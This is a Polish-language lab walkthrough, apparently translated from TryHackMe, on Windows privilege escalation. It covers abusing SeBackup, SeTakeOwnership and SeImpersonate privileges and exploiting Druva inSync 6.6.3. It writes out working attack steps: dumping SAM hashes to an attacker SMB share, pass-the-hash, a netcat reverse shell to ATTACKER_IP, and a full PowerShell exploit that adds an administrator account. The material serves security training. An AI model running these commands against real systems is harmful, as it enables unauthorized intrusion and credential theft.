Uprawnienia to prawa, które konto ma do wykonywania określonych zadań systemowych. Zadania te mogą być tak proste, jak uprawnienie do wyłączania komputera, aż po uprawnienia do omijania niektórych DACL-na podstawie kontroli dostępu.

Każdemu użytkownikowi przypisany jest zestaw uprawnień, które można sprawdzić za pomocą następującego polecenia:

```shell-session
whoami /priv
```

Pełną listę dostępnych uprawnień w systemach Windows znajdziesz [tutaj(otwiera się w nowej karcie)](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)Z punktu widzenia atakującego interesujące są tylko te uprawnienia, które pozwalają nam na eskalację w systemie. Pełną listę uprawnień nadających się do wykorzystania można znaleźć na stronie [Priv2Admin.(otwiera się w nowej karcie)](https://github.com/gtworek/Priv2Admin)Projekt Github.

Nie będziemy się im bliżej przyglądać, pokażemy jednak, jak nadużywać niektórych z najczęstszych uprawnień.

## SeBackup / SeRestore

Uprawnienia SeBackup i SeRestore pozwalają użytkownikom na odczyt i zapis dowolnego pliku w systemie, ignorując wszelkie obowiązujące listy DACL. Celem tego uprawnienia jest umożliwienie niektórym użytkownikom tworzenia kopii zapasowych z systemu bez konieczności posiadania pełnych uprawnień administracyjnych.

Dysponując tą możliwością, atakujący może w prosty sposób eskalować uprawnienia w systemie, stosując wiele technik. Ta, którą omówimy, polega na skopiowaniu gałęzi rejestru SAM i SYSTEM w celu uzyskania skrótu hasła lokalnego administratora.

Zaloguj się do komputera docelowego za pomocą protokołu RDP, używając następujących danych logowania:

**Użytkownik:** `THMBackup`

**Hasło:**`CopyMaster555`

To konto należy do grupy „Operatorzy kopii zapasowych”, która domyślnie ma uprawnienia SeBackup i SeRestore. Aby skorzystać z tych uprawnień, musimy otworzyć wiersz poleceń za pomocą opcji „Otwórz jako administrator”. Zostaniemy poproszeni o ponowne podanie hasła, aby uzyskać dostęp do konsoli z podwyższonymi uprawnieniami:

![Uruchom jako administrator](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png)  

Po przejściu do wiersza poleceń możemy sprawdzić nasze uprawnienia za pomocą następującego polecenia:

Wiersz poleceń

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Aby wykonać kopię zapasową skrótów SAM i SYSTEM, możemy użyć następujących poleceń:

Wiersz poleceń

```shell-session
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

Spowoduje to utworzenie kilku plików z zawartością gałęzi rejestru. Możemy teraz skopiować te pliki na maszynę atakującego za pomocą protokołu SMB lub dowolnej innej dostępnej metody. W przypadku protokołu SMB możemy użyć programu impacket, `smbserver.py`aby uruchomić prosty skrypt.MŚPserwer z udziałem sieciowym w bieżącym katalogu naszego AttackBoxa:

Kali Linux

```shell-session
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

Spowoduje to utworzenie udziału o nazwie `public`wskazującej na `share`katalog, który wymaga podania nazwy użytkownika i hasła z bieżącej sesji systemu Windows. Następnie możemy użyć polecenia `copy`na komputerze z systemem Windows, aby przenieść oba pliki do AttackBox: 

Wiersz poleceń

```shell-session
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

Następnie użyj impacket, aby pobrać skróty haseł użytkowników:

Kali Linux

```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

Możemy wreszcie wykorzystać skrót administratora do przeprowadzenia ataku Pass-the-Hash i uzyskać dostęp do maszyny docelowej z uprawnieniami SYSTEM:

KaliLinux

```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.130.146.112
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
## Przejmij własność

Uprawnienie SeTakeOwnership pozwala użytkownikowi przejąć na własność dowolny obiekt w systemie, w tym pliki i klucze rejestru, otwierając przed atakującym wiele możliwości podniesienia uprawnień, na przykład poprzez wyszukanie usługi działającej jako SYSTEM i przejęcie na własność pliku wykonywalnego tej usługi. W tym przypadku jednak obierzemy inną drogę.

Zaloguj się do komputera docelowego za pomocą protokołu RDP, używając następujących danych logowania:

**Użytkownik:** `THMTakeOwnership`

**Hasło:** `TheWorldIsMine2022`

Aby uzyskać uprawnienie SeTakeOwnership, musimy otworzyć wiersz poleceń, korzystając z opcji „Otwórz jako administrator”. Zostaniemy poproszeni o podanie hasła, aby uzyskać dostęp do konsoli z podwyższonymi uprawnieniami:

![Uruchom jako administrator](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png)  

Po przejściu do wiersza poleceń możemy sprawdzić nasze uprawnienia za pomocą następującego polecenia:

Wiersz poleceń

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

Tym razem nadużyjemy `utilman.exe`uprawnień. Utilman to wbudowana aplikacja systemu Windows, która zapewnia opcje ułatwień dostępu na ekranie blokady:

![utilman normalne zachowanie](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)  

Ponieważ Utilman jest uruchamiany z uprawnieniami SYSTEM, efektywnie uzyskamy uprawnienia SYSTEM, jeśli zastąpimy oryginalny plik binarny dowolnym, wybranym przez nas ładunkiem. Ponieważ możemy przejąć własność nad dowolnym plikiem, jego zastąpienie jest banalnie proste.

Aby zastąpić utilman, zaczniemy od przejęcia nad nim własności za pomocą następującego polecenia:

Wiersz poleceń

```shell-session
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

Pamiętaj, że bycie właścicielem pliku niekoniecznie oznacza posiadanie do niego uprawnień, ale będąc właścicielem, możesz przypisać sobie dowolne uprawnienia. Aby nadać użytkownikowi pełne uprawnienia do pliku utilman.exe, możesz użyć następującego polecenia:

Wiersz poleceń

```shell-session
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

Następnie zastąpimy utilman.exe kopią cmd.exe:

Wiersz poleceń

```shell-session
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

Aby uruchomić utilman, zablokujemy ekran przyciskiem Start:

![ekran blokady](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png)  

Na koniec kliknij przycisk „Ułatwienia dostępu”, który uruchomi plik utilman.exe z uprawnieniami SYSTEM. Ponieważ zastąpiliśmy go kopią cmd.exe, pojawi się wiersz poleceń z uprawnieniami SYSTEM:

![powłoka utilman](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)  

## SeImpersonate / SeAssignPrimaryToken

Te uprawnienia pozwalają procesowi podszywać się pod innych użytkowników i działać w ich imieniu. Podszywanie się zazwyczaj polega na możliwości uruchomienia procesu lub wątku w kontekście bezpieczeństwa innego użytkownika.

Podszywanie się jest łatwe do zrozumienia, gdy pomyślimy o tym, jak działa serwer FTP. Serwer FTP musi ograniczać użytkownikom dostęp wyłącznie do plików, które powinni mieć dostęp.

Załóżmy, że mamy uruchomioną usługę FTP z użytkownikiem `ftp`. Bez podszywania się, jeśli użytkownik Ann zaloguje się doFTPserwer i próbuje uzyskać dostęp do jej plików,FTPUsługa będzie próbowała uzyskać do nich dostęp za pomocą swojego tokena dostępu, a nie tokena Ann:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e5768172fbb97d6777dde7e15a3fcfc.png)  

Istnieje kilka powodów, dla których warto używaćftpToken 's nie jest najlepszym pomysłem: - Aby pliki były poprawnie dostarczane, musiałyby być dostępne dla `ftp`użytkownika. W powyższym przykładzieFTPUsługa miałaby dostęp do plików Anny, ale nie do plików Billa, ponieważ lista DACL w plikach Billa nie zezwala na dostęp użytkownika `ftp`. To zwiększa złożoność, ponieważ musimy ręcznie skonfigurować określone uprawnienia dla każdego obsługiwanego pliku/katalogu. - W systemie operacyjnym dostęp do wszystkich plików jest możliwy przez użytkownika `ftp`, niezależnie od tego, który użytkownik jest aktualnie zalogowany.FTPusługa. Uniemożliwia to delegowanie uprawnień do systemu operacyjnego, dlategoFTPusługa musi to wdrożyć. - JeśliFTPGdyby w pewnym momencie usługa została naruszona, atakujący natychmiast uzyskałby dostęp do wszystkich folderów, do których `ftp`użytkownik ma dostęp.

Jeśli natomiastFTPużytkownik usługi ma uprawnienie SeImpersonate lub SeAssignPrimaryToken, wszystko to jest nieco uproszczone, ponieważFTPUsługa może tymczasowo przechwycić token dostępu logującego się użytkownika i użyć go do wykonania dowolnego zadania w jego imieniu:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89e74e14454edc10fa2bd541ac359772.png)  

Teraz, jeśli użytkownik Ann zaloguje się doFTPusługa i biorąc pod uwagę, żeftpUżytkownik ma uprawnienia do podszywania się, może pożyczyć token dostępu Anny i użyć go do uzyskania dostępu do jej plików. W ten sposób pliki nie muszą `ftp`w żaden sposób zapewniać użytkownikowi dostępu, a autoryzacją zajmuje się system operacyjny. PonieważFTPUsługa podszywa się pod Ann, nie będzie mogła uzyskać dostępu do plików Jude’a i Billa podczas tej sesji.

Jeśli jako atakujący przejmiemy kontrolę nad procesem za pomocą uprawnień SeImpersonate lub SeAssignPrimaryToken, będziemy mogli podszywać się pod dowolnego użytkownika łączącego się z tym procesem i uwierzytelniającego się w nim.

W systemach Windows konta LOKALNEJ USŁUGI i USŁUGI SIECIOWEJ mają już takie uprawnienia. Ponieważ konta te służą do tworzenia usług z wykorzystaniem kont z ograniczeniami, warto zezwolić im na podszywanie się pod użytkowników, jeśli usługa tego wymaga. Usługi Internet Information Services (IIS) utworzą również podobne konto domyślne o nazwie „iis apppool\defaultapppool” dla aplikacji internetowych.

Aby zwiększyć uprawnienia przy użyciu takich kont, atakujący musi: 1. Utworzyć proces, aby użytkownicy mogli się do niego podłączyć i uwierzytelnić, co umożliwi podszywanie się pod niego. 2. Znaleźć sposób na wymuszenie na użytkownikach z uprawnieniami połączenia się i uwierzytelnienia w utworzonym złośliwym procesie.

Wykorzystamy exploit RogueWinRM, aby spełnić oba warunki.

Załóżmy na początek, że już naruszyliśmy bezpieczeństwo witryny internetowej działającej na serwerze IIS i umieściliśmy powłokę internetową na następującym adresie:

`http://10.130.146.112/`

Możemy użyć powłoki internetowej, aby sprawdzić uprawnienia przypisane do naruszonego konta i potwierdzić, że posiadamy obydwa interesujące nas uprawnienia w kontekście tego zadania:

![Uprawnienia do podszywania się pod Webshell](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)  

Aby użyć RogueWinRM, musimy najpierw wgrać exploita na komputer docelowy. Dla wygody zostało to już zrobione, a exploit można znaleźć w `C:\tools\`folderze.

Wykorzystanie luki w zabezpieczeniach RogueWinRM jest możliwe, ponieważ za każdym razem, gdy użytkownik (w tym użytkownicy bez uprawnień) uruchamia usługę BITS w systemie Windows, automatycznie tworzy ona połączenie z portem 5985 z uprawnieniami SYSTEM. Port 5985 jest zazwyczaj używany przez usługę WinRM, która jest po prostu portem udostępniającym konsolę programu PowerShell, z której można korzystać zdalnie przez sieć. Można to porównać do protokołu SSH, ale z użyciem programu PowerShell.

Jeśli z jakiegoś powodu usługa WinRM nie działa na serwerze ofiary, atakujący może uruchomić fałszywą usługę WinRM na porcie 5985 i przechwycić próbę uwierzytelnienia podjętą przez usługę BITS podczas uruchamiania. Jeśli atakujący ma uprawnienia SeImpersonate, może wykonać dowolne polecenie w imieniu łączącego się użytkownika, czyli SYSTEM.

Przed uruchomieniem exploita uruchomimy program nasłuchujący netcat, aby odebrać odwrotną powłokę na komputerze atakującego:

Kali Linux

```shell-session
user@attackerpc$ nc -lvp 4442
```

Następnie użyj naszej powłoki internetowej, aby uruchomić exploit RogueWinRM za pomocą następującego polecenia:

```shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![Wykonanie exploita RogueWinRM](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png)  

**Uwaga:** Działanie exploita może potrwać do 2 minut, więc przeglądarka może przez chwilę wydawać się nieaktywna. Dzieje się tak, gdy exploit jest uruchamiany wielokrotnie, ponieważ musi on poczekać na zatrzymanie usługi BITS przed ponownym uruchomieniem. Usługa BITS zatrzyma się automatycznie po 2 minutach od uruchomienia.

Parametr `-p`określa plik wykonywalny, który ma zostać uruchomiony przez exploit, `nc64.exe`w tym przypadku jest to… `-a`Parametr służy do przekazywania argumentów do pliku wykonywalnego. Ponieważ chcemy, aby nc64 ustanowił odwrotną powłokę na komputerze atakującego, argumenty do przekazania netcat będą następujące `-e cmd.exe ATTACKER_IP 4442`:

Jeżeli wszystko zostało poprawnie skonfigurowane, powinieneś spodziewać się powłoki z uprawnieniami SYSTEM:

Kali Linux

```shell-session
user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```

Korzystając z dowolnej z trzech metod omówionych w tym zadaniu, uzyskaj dostęp do pulpitu administratora i zbierz flagę. Nie zapomnij wpisać flagi na końcu zadania.

## Niezałatane oprogramowanie

Oprogramowanie zainstalowane w systemie docelowym może stwarzać różne możliwości eskalacji uprawnień. Podobnie jak w przypadku sterowników, organizacje i użytkownicy mogą nie aktualizować ich tak często, jak aktualizują system operacyjny. Za pomocą narzędzia można  `wmic` wyświetlić listę oprogramowania zainstalowanego w systemie docelowym i jego wersji. Poniższe polecenie wyświetli informacje, które może zebrać na temat zainstalowanego oprogramowania (ukończenie może zająć około minuty):

```shell-session
wmic product get name,version,vendor
```

Pamiętaj, że  `wmic product` polecenie może nie zwrócić wszystkich zainstalowanych programów. W zależności od sposobu instalacji, niektóre programy mogą nie zostać tutaj wymienione. Zawsze warto sprawdzić skróty na pulpicie, dostępne usługi lub ogólnie wszelkie ślady wskazujące na istnienie dodatkowego oprogramowania, które może być podatne na ataki.

Po zebraniu informacji o wersji produktu zawsze możemy wyszukać istniejące exploity w zainstalowanym oprogramowaniu online na stronach takich jak  [exploit-db(otwiera się w nowej karcie)](https://www.exploit-db.com/),  [burza pakietów(otwiera się w nowej karcie)](https://packetstormsecurity.com/) lub zwykłego starego  [Google'a(otwiera się w nowej karcie)](https://www.google.com/), wśród wielu innych.

Czy używając wmic i Google, możesz znaleźć znaną lukę w zabezpieczeniach dowolnego zainstalowanego produktu?

## Studium przypadku: Druva inSync 6.6.3

Na serwerze docelowym działa Druva inSync 6.6.3, który jest podatny na eskalację uprawnień, jak donosi [Matteo Malvica(otwiera się w nowej karcie)](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/)Luka wynika z zastosowania złej poprawki na inną lukę zgłoszoną pierwotnie dla wersji 6.5.0 przez [Chrisa Lyne’a(otwiera się w nowej karcie)](https://www.tenable.com/security/research/tra-2020-12).

Oprogramowanie jest podatne na ataki, ponieważ uruchamia serwer RPC (Remote Procedure Call) na porcie 6064 z uprawnieniami SYSTEM, dostępny wyłącznie z poziomu localhost. Jeśli nie znasz RPC, jest to po prostu mechanizm, który pozwala danemu procesowi udostępniać funkcje (zwane w żargonie RPC procedurami) przez sieć, umożliwiając innym maszynom zdalne wywoływanie ich.

W przypadku Druva inSync, jedna z procedur udostępnionych (a konkretnie procedura numer 5) na porcie 6064 umożliwiała każdemu żądanie wykonania dowolnego polecenia. Ponieważ serwer RPC działa jako SYSTEM, każde polecenie jest wykonywane z uprawnieniami SYSTEM.

Pierwotna luka w zabezpieczeniach zgłoszona w wersjach 6.5.0 i starszych umożliwiała uruchamianie dowolnych poleceń bez ograniczeń. Pierwotnym zamysłem stojącym za udostępnieniem tej funkcjonalności było zdalne uruchamianie określonych plików binarnych dostarczonych z inSync, a nie dowolnego polecenia. Mimo to nie przeprowadzono żadnego sprawdzenia, aby to potwierdzić.

Wydano poprawkę, w której postanowiono sprawdzić, czy wykonywane polecenie zaczyna się od ciągu znaków `C:\ProgramData\Druva\inSync4\`, w którym powinny znajdować się dozwolone pliki binarne. Okazało się to jednak niewystarczające, ponieważ można było po prostu przeprowadzić atak polegający na przechodzeniu przez ścieżkę, aby ominąć ten rodzaj kontroli. Załóżmy, że chcesz wykonać polecenie `C:\Windows\System32\cmd.exe`, które nie znajduje się w dozwolonej ścieżce; wystarczyło poprosić serwer o uruchomienie `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`, co skutecznie ominęłoby sprawdzanie.

Aby stworzyć działający exploit, musimy zrozumieć, jak komunikować się z portem 6064. Na szczęście używany protokół jest prosty, a pakiety do wysłania przedstawiono na poniższym diagramie:

![Schemat wykorzystania Druva](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png)

Pierwszy pakiet to po prostu pakiet „hello” zawierający stały ciąg znaków. Drugi pakiet wskazuje, że chcemy wykonać procedurę numer 5, ponieważ jest to podatna na atak procedura, która wykona za nas dowolne polecenie. Dwa ostatnie pakiety służą do przesłania odpowiednio długości polecenia i ciągu znaków polecenia, które ma zostać wykonane.

Pierwotnie opublikowane przez Matteo Malvicę [tutaj(otwiera się w nowej karcie)](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html)Poniższy exploit można wykorzystać na komputerze docelowym do podniesienia uprawnień i pobrania flagi tego zadania. Dla wygody poniżej znajduje się oryginalny kod exploita:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Możesz wyskoczyć PowerShell konsoli i wklej exploit bezpośrednio, aby go uruchomić (exploit jest również dostępny na komputerze docelowym pod adresem  `C:\tools\Druva_inSync_exploit.txt`). Należy pamiętać, że domyślny ładunek exploita, określony w `$cmd`zmiennej, utworzy użytkownika o podanej nazwie `pwnd`w systemie, ale nie nada mu uprawnień administratora, więc prawdopodobnie będziemy chcieli zmienić ładunek na coś bardziej użytecznego. W tym przypadku zmienimy ładunek, aby uruchomić następujące polecenie:

```powershell
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

Spowoduje to utworzenie użytkownika `pwnd`z hasłem `SimplePass123`i dodanie go do grupy administratorów. Jeśli exploit się powiódł, powinieneś móc uruchomić poniższe polecenie, aby sprawdzić, czy użytkownik `pwnd`istnieje i należy do grupy administratorów:

Wiersz poleceń

```shell-session
PS C:\> net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

Ostatnim krokiem jest uruchomienie wiersza poleceń jako administrator:

![Uruchom wiersz poleceń jako Pwnd](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png)  

Gdy pojawi się monit o podanie danych uwierzytelniających, użyj `pwnd`konta. Z nowego wiersza poleceń możesz  pobrać flagę z pulpitu administratora za pomocą następującego polecenia  `type C:\Users\Administrator\Desktop\flag.txt`:

stnieje kilka skryptów, które przeprowadzają enumerację systemu w sposób podobny do opisanego w poprzednim zadaniu. Narzędzia te mogą skrócić czas procesu enumeracji i wykryć różne potencjalne wektory eskalacji uprawnień. Należy jednak pamiętać, że narzędzia zautomatyzowane mogą czasami nie wykryć eskalacji uprawnień.

Poniżej znajduje się kilka narzędzi powszechnie używanych do identyfikacji wektorów eskalacji uprawnień. Możesz je przetestować na dowolnej maszynie w tej sali i sprawdzić, czy wyniki pokrywają się z omówionymi wektorami ataku.

## WinPEAS

WinPEAS to skrypt opracowany w celu enumeracji systemu docelowego w celu wykrycia ścieżek eskalacji uprawnień. Możesz znaleźć więcej informacji o WinPEAS i pobrać prekompilowany plik wykonywalny lub skrypt .bat. WinPEAS uruchomi polecenia podobne do wymienionych w poprzednim zadaniu i wyświetli ich wyniki. Dane wyjściowe WinPEAS mogą być obszerne i czasami trudne do odczytania. Dlatego dobrą praktyką jest zawsze przekierowywanie danych wyjściowych do pliku, jak pokazano poniżej:

Wiersz poleceń

```shell-session
C:\> winpeas.exe > outputfile.txt
```

WinPEAS można pobrać [tutaj(otwiera się w nowej karcie)](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).  

## PrivescCheck

PrivescCheck to skrypt programu PowerShell, który wyszukuje typowe przypadki eskalacji uprawnień w systemie docelowym. Stanowi alternatywę dla WinPEAS bez konieczności uruchamiania pliku binarnego.

PrivescCheck można pobrać [tutaj(otwiera się w nowej karcie)](https://github.com/itm4n/PrivescCheck).

**Przypomnienie** : Aby uruchomić PrivescCheck w systemie docelowym, może być konieczne ominięcie ograniczeń zasad wykonywania. Aby to osiągnąć, można użyć polecenia `Set-ExecutionPolicy`cmdlet, jak pokazano poniżej.

PowerShell

```shell-session
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

## WES-NG: Sugestia wykorzystania luk w zabezpieczeniach systemu Windows — następna generacja

Niektóre exploity sugerujące skrypty (np. winPEAS) wymagają przesłania ich do systemu docelowego i uruchomienia tam. Może to spowodować ich wykrycie i usunięcie przez program antywirusowy. Aby uniknąć niepotrzebnego hałasu, który mógłby przyciągnąć uwagę, możesz użyć WES-NG, który uruchomi się na atakującym komputerze (np. Kali lub TryHackMe AttackBox).

WES-NG to skrypt w Pythonie, który można znaleźć i pobrać [tutaj(otwiera się w nowej karcie)](https://github.com/bitsadmin/wesng).

Po zainstalowaniu, a przed użyciem, wpisz `wes.py --update`polecenie aktualizacji bazy danych. Skrypt odwołuje się do utworzonej bazy danych, aby sprawdzić, czy nie brakuje poprawek, które mogą spowodować lukę w zabezpieczeniach, którą możesz wykorzystać do podniesienia uprawnień w systemie docelowym.

Aby użyć skryptu, należy uruchomić polecenie `systeminfo` w systemie docelowym. Nie zapomnij przekierować danych wyjściowych do pliku .txt, który będzie trzeba przenieść na maszynę atakującą.

Po wykonaniu tej czynności plik wes.py można uruchomić w następujący sposób:

Kali Linux

```shell-session
user@kali$ wes.py systeminfo.txt
```

## Metasploit

Jeśli na systemie docelowym znajduje się już powłoka Meterpretera, możesz użyć tego `multi/recon/local_exploit_suggester`modułu, aby wyświetlić listę luk w zabezpieczeniach, które mogą mieć wpływ na system docelowy, i uzyskać możliwość podniesienia uprawnień w systemie docelowym.

W tej sali przedstawiliśmy kilka technik eskalacji uprawnień dostępnych w systemach Windows. Techniki te powinny zapewnić Ci solidne podstawy na temat najczęstszych sposobów, jakie atakujący mogą obrać, aby podnieść uprawnienia w systemie. Jeśli chcesz poznać dodatkowe techniki, dostępne są następujące zasoby:

- [PayloadsAllTheThings – eskalacja uprawnień systemu Windows(otwiera się w nowej karcie)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin – nadużywanie uprawnień systemu Windows(otwiera się w nowej karcie)](https://github.com/gtworek/Priv2Admin)
- [Exploit RogueWinRM(otwiera się w nowej karcie)](https://github.com/antonioCoco/RogueWinRM)
- [Ziemniaki(otwiera się w nowej karcie)](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Blog Dekodera(otwiera się w nowej karcie)](https://decoder.cloud/)
- [Porwanie symboliczne(otwiera się w nowej karcie)](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - eskalacja uprawnień lokalnych w systemie Windows](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
